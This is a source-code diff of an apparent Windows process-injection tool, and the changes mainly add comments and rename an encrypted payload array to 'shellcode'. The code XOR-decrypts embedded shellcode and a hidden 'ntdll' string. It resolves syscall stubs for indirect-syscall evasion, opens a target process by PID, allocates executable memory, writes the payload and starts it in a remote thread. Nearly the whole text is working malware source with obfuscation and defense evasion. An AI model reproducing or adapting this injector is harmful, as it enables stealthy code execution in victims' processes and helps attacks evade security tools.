@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include "wonka.h"
 
+//bring in and define external variables
 extern "C" {
     DWORD CSSN;
     DWORD OPSSN;
@@ -17,7 +18,8 @@ extern "C" {
     UINT_PTR NtCancelTimerSyscall;
 }
 
-unsigned char oppenhiemer[] = 
+//define XOR encrypted shellcode
+unsigned char shellcode[] = 
     "\xa6\x29\xf0\x80\x87\x8d\xb3\x32\x5a\x61\x32\x35\x36\x35\x21\x63"
     "\xc\x29\x42\xb6\x12\x2d\xf8\x60\x3a\x29\xf8\x36\x6f\x2d\xf8\x60"
     "\x7a\x29\xf8\x16\x27\x2d\x7c\x85\x10\x2b\x3e\x55\xbe\x2d\x42\xf2"
@@ -37,15 +39,18 @@ unsigned char oppenhiemer[] =
     "\x49\x13\x1c\xe\x77\x3c\x32\xbb\x80\x9e\xa6\xa\x18\x11\x16\x42"
     "\x3b\x5\x5d\x1\xf\x0\x73";
 
+//define XOR encrypted string NTDLL
 char NDLCRY[] = "\x14\x35\x37\x28\x3b";
 
 int main(int argc, char* argv[]) {
 
+    //decrypt shellcode
     char key[] = "Zasdwes2";
-    int ciphertext_length = sizeof(oppenhiemer);
-    xor_decrypt(oppenhiemer, ciphertext_length, key);
+    int ciphertext_length = sizeof(shellcode);
+    xor_decrypt(shellcode, ciphertext_length, key);
 
-    SIZE_T rS = sizeof(oppenhiemer);
+    //define necessary variables for use
+    SIZE_T rS = sizeof(shellcode);
     LARGE_INTEGER timeout;
     timeout.QuadPart = -1100;
     HANDLE pH = NULL;
@@ -55,7 +60,7 @@ int main(int argc, char* argv[]) {
     HMODULE hNTDLL;
     NTSTATUS STATUS = NULL;
 
-    
+    //check if PID was passed as argument, if not exit
     if (argc < 2) {
         printf("run with %s: <PID>", argv[0]);
         return EXIT_FAILURE;
@@ -65,42 +70,51 @@ int main(int argc, char* argv[]) {
     OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
     CLIENT_ID CID = { (HANDLE)(uintptr_t)PID, NULL };
 
+    //decrypt ntdll string and convert to LPCWSTR
     DecryptXOR(NDLCRY, strlen(NDLCRY), key, strlen(key));
-
     LPCWSTR NDLNOCRY = ConvertToLPCWSTR(NDLCRY);
+
+    //get handle to ntdll
     hNTDLL = GetModuleHandleW(NDLNOCRY);
 
+    //get stub location of timer related syscalls
     IndirectPrelude(hNTDLL, "NtCreateTimer", &NtCreateTimerSyscall);
     IndirectPrelude(hNTDLL, "NtOpenTimer", &NtOpenTimerSyscall);
     IndirectPrelude(hNTDLL, "NtSetTimer", &NtSetTimerSyscall);
     IndirectPrelude(hNTDLL, "NtQueryTimer", &NtQueryTimerSyscall);
     IndirectPrelude(hNTDLL, "NtCancelTimer", &NtCancelTimerSyscall);
 
+    //open process with the passed PID
     STATUS = OP(&pH, PROCESS_ALL_ACCESS, &OA, &CID);
     if (!STATUS == STATUS_SUCCESS) {
         return EXIT_FAILURE;
     }
 
+    //allocate memory inside of the process
     STATUS = AVM(pH, &bA, 0, &rS, MEM_COMMIT | MEM_RESERVE, 0x40);
     if (!STATUS == STATUS_SUCCESS) {
         return EXIT_FAILURE;
     }
-    
-    STATUS = WVM(pH, bA, oppenhiemer, sizeof(oppenhiemer), NULL);
+
+    //write the shellcode to the allocated region
+    STATUS = WVM(pH, bA, shellcode, sizeof(shellcode), NULL);
     if (!STATUS == STATUS_SUCCESS) {
         return EXIT_FAILURE;
     }
 
+    //create and execute thread with the previously written shellcode
     STATUS = CT(&nT, THREAD_ALL_ACCESS, NULL, pH, bA, NULL, FALSE, 0, 0, 0, NULL);
     if (!STATUS == STATUS_SUCCESS) {
         return EXIT_FAILURE;
     }
 
+    //wait for thread to be fully executed conclude
     STATUS = WFSO(nT, FALSE, NULL);
     if (!STATUS == STATUS_SUCCESS) {
         return EXIT_FAILURE;
     }
 
+    //cleanup by closing thread and closing process handle
     if (nT) {
         C(nT);
     }
